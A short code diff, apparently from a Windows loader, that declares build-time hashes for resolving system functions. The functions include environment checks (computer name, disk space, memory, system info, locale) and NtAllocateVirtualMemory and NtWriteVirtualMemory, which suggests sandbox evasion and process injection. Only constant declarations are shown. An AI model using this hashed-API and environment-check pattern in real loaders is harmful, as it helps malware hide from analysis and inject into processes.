@@ -5,12 +5,15 @@
 const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
 const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
 
+const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
 const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
 const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
 const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
+const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
+const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;
+
 const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
 const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;
-const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
 
 const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__NtAllocateVirtualMemory%;
 const ObjHash WRITE_MEMORY_HASH = %FCTHASH__NtWriteVirtualMemory%;
